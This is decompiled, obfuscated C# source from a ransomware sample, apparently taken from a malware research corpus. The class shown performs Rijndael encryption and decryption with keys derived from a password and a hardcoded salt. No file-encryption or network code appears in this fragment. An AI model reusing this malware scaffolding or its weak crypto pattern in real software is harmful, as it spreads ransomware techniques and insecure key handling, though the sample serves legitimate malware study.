// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Output, Version=1.1.0.0, Culture=neutral, PublicKeyToken=ed61553e989492b3
// MVID: BAAA0E94-9CB2-4361-AD86-CB5008FBF34B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Ransom.Win32.Mbro.fki-0638a076ec9495722c68ad33b29f5e9a4c9f91911ba00f42ec93ab46e642fa74.exe

using \u0002;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0002
{
  internal class \u0005
  {
    [NonSerialized]
    internal static \u0007 \u001D;

    private static byte[] \u0001([In] byte[] obj0, [In] byte[] obj1, [In] byte[] obj2)
    {
      byte[] numArray;
      try
      {
        MemoryStream memoryStream = new MemoryStream();
        Rijndael rijndael = \u0088.\u007F\u0002();
        \u0089.\u007E\u0080\u0002((object) rijndael, obj1);
        \u0089.\u007E\u0081\u0002((object) rijndael, obj2);
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, \u008A.\u007E\u0082\u0002((object) rijndael), CryptoStreamMode.Write);
        \u008B.\u007E\u0084\u0002((object) cryptoStream, obj0, 0, obj0.Length);
        \u0012.\u007E\u0094((object) cryptoStream);
        numArray = \u008C.\u007E\u0086\u0002((object) memoryStream);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u001C.\u000F\u0002();
      }
      return numArray;
    }

    public static string \u0001([In] string obj0, [In] string obj1)
    {
      string str;
      try
      {
        byte[] numArray1 = \u008E.\u007E\u0089\u0002((object) \u008D.\u0087\u0002(), obj0);
        PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(obj1, new byte[13]
        {
          (byte) 73,
          (byte) 118,
          (byte) 97,
          (byte) 110,
          (byte) 32,
          (byte) 77,
          (byte) 101,
          (byte) 100,
          (byte) 118,
          (byte) 101,
          (byte) 100,
          (byte) 101,
          (byte) 118
        });
        byte[] numArray2 = \u0005.\u0001(numArray1, \u008F.\u007E\u008B\u0002((object) passwordDeriveBytes, 32), \u008F.\u007E\u008B\u0002((object) passwordDeriveBytes, 16));
        str = \u0090.\u008C\u0002(numArray2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u001C.\u000F\u0002();
      }
      return str;
    }

    private static byte[] \u0002([In] byte[] obj0, [In] byte[] obj1, [In] byte[] obj2)
    {
      byte[] numArray;
      try
      {
        MemoryStream memoryStream = new MemoryStream();
        Rijndael rijndael = \u0088.\u007F\u0002();
        \u0089.\u007E\u0080\u0002((object) rijndael, obj1);
        \u0089.\u007E\u0081\u0002((object) rijndael, obj2);
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, \u008A.\u007E\u0083\u0002((object) rijndael), CryptoStreamMode.Write);
        \u008B.\u007E\u0084\u0002((object) cryptoStream, obj0, 0, obj0.Length);
        \u0012.\u007E\u0094((object) cryptoStream);
        numArray = \u008C.\u007E\u0086\u0002((object) memoryStream);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u001C.\u000F\u0002();
      }
      return numArray;
    }

    public static string \u0002([In] string obj0, [In] string obj1)
    {
      string str;
      try
      {
        byte[] numArray1 = \u0091.\u008D\u0002(obj0);
        PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(obj1, new byte[13]
        {
          (byte) 73,
          (byte) 118,
          (byte) 97,
          (byte) 110,
          (byte) 32,
          (byte) 77,
          (byte) 101,
          (byte) 100,
          (byte) 118,
          (byte) 101,
          (byte) 100,
          (byte) 101,
          (byte) 118
        });
        byte[] numArray2 = \u0005.\u0002(numArray1, \u008F.\u007E\u008B\u0002((object) passwordDeriveBytes, 32), \u008F.\u007E\u008B\u0002((object) passwordDeriveBytes, 16));
        str = \u0092.\u007E\u008E\u0002((object) \u008D.\u0087\u0002(), numArray2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = \u0005.\u001D(1177);
        \u001C.\u000F\u0002();
      }
      return str;
    }

    static \u0005() => \u0006.\u0002.\u0001(typeof (\u0005));
  }
}
